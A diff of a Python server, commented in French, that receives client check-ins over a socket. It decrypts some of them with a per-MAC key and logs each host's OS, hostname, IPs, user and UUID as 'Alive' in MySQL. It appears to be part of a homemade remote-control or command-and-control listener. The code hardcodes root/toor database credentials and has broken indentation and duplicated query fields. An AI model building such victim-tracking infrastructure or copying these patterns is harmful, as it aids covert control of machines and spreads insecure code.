@@ -3,6 +3,7 @@
 
 import socket
 import time
+import hashlib
 import threading
 import MySQLdb
 from functions import check_alive
@@ -30,6 +31,61 @@ class ClientThread(threading.Thread):
             pass
 
         if alive == True:
+	    mac = receive[0:13]
+	    is_encrypted = mac.isdigit()
+
+	    if str(is_encrypted) == "True":
+		encrypt = str(receive)
+
+                mac = encrypt[0:13]
+                encrypt = encrypt.replace(mac,"")
+
+                PSK = get_key_from_mac(mac)
+                key = hashlib.sha256(PSK).digest()
+
+                msg = decrypt(encrypt,key)
+
+		if "Infos" in str(msg):
+	                infos = str(msg)
+        	        for items in infos.split(','):
+               	        	array_infos.append(items)
+                        	# Incrémente les infos dans une liste
+
+                	array_infos[0] = array_infos[0].replace("b'", "")
+ 	        	array_infos[-1] = array_infos[-1].replace("'", "")
+          		# Formate les élements de la liste
+
+                	if str(array_infos[2]) == "nt":
+                    		array_infos[2] = "Windows"
+                	else:
+                    		array_infos[2] = "Unix"
+                		# Associe le bon système d'exploitation au résultat
+
+                	uuid = str(array_infos[1])
+
+                	db = MySQLdb.connect("localhost","root","toor","clients")
+			cursor = db.cursor()
+	                # Init connexion à la BDD
+
+        	        cursor.execute( """SELECT uuid FROM clients.clients WHERE uuid = %s""", [uuid] )
+       		       	rows = cursor.fetchall()
+              		# Cherche doublons UUID avant ajout en BDD
+                	if str(rows) != "()":
+                        	try:
+ 					cursor.execute("""UPDATE clients.clients SET status = %s, os = %s, computer = %s, lip = %s, user = %s, pip = %s, status = %s, last_alive = %s WHERE uuid = %s""",('Alive',array_infos[2],array_infos[3],array_infos[4],array_infos[5],array_infos[6],'Alive',array_infos[0],[uuid]))
+	                            	db.commit()
+				        print("[+] " + str(array_infos[1])) + " is alive"
+        	                except:
+                	                db.rollback()
+                	                print("[-] Impossible d'ajouter le client dans le BDD")
+                       		db.close()
+                	else:
+                        	print("debug")
+                		# Ajoute les informations clientes dans la base de données
+		else:
+			print("Unknown format message " + str(msg))
+
+
 	    if "Init" in str(receive):
 		infos = str(receive)
                 for items in infos.split(','):
@@ -62,7 +118,7 @@ class ClientThread(threading.Thread):
                         print("[+] Client is back : " + str(rows)).replace("(('","")[:-5]
                 # Ajoute les informations clientes dans la base de données
 
-            if "Init2" in str(receive):
+            if "Infos" in str(receive):
                 infos = str(receive)
                 for items in infos.split(','):
                     array_infos.append(items)
@@ -87,17 +143,18 @@ class ClientThread(threading.Thread):
 		cursor.execute( """SELECT uuid FROM clients.clients WHERE uuid = %s""", [uuid] )
 	        rows = cursor.fetchall()
 		# Cherche doublons UUID avant ajout en BDD
-        	if str(rows) == "()":
-                	try:
-                        	cursor.execute("""INSERT INTO clients.clients (last_alive,uuid,os,computer,lip,user,pip,mac) VALUES (%s,%s,%s,%s,%s,%s,%s,%s)""",(array_infos[0],array_infos[1],array_infos[2],array_infos[3],array_infos[4],array_infos[5],array_infos[6],'Alive'))
-                        	db.commit()
-                        	print("[+] Got a new client : " + str(array_infos))
-	                except:
-        	                db.rollback()
-                	        print("[-] Impossible d'ajouter le client dans le BDD")
-               		db.close()
-	        else:
-        	        print("[+] Client is back : " + str(rows)).replace("(('","")[:-5]
+        	if str(rows) != "()":
+
+			try:
+				cursor.execute("""UPDATE clients.clients SET status = %s, os = %s, computer = %s, lip = %s, user = %s, pip = %s WHERE uuid = %s""",('Alive',array_infos[2],array_infos[3],array_infos[4],array_infos[5],array_infos[6],[uuid]))
+				db.commit()
+                                print("[+] Init2 from : " + str(array_infos))
+                        except:
+                                db.rollback()
+                                print("[-] Impossible d'ajouter le client dans le BDD")
+                        db.close()
+                else:
+			print("debug")
         	# Ajoute les informations clientes dans la base de données
 
             elif "Alive" in str(receive):
@@ -143,7 +200,7 @@ class ClientThread(threading.Thread):
 	    elif "Alive" in str(receive):
                 pass
             else:
-                print("[-] Incorrect message format : " + str(receive))
+		pass
 
 class is_down(Thread):
 
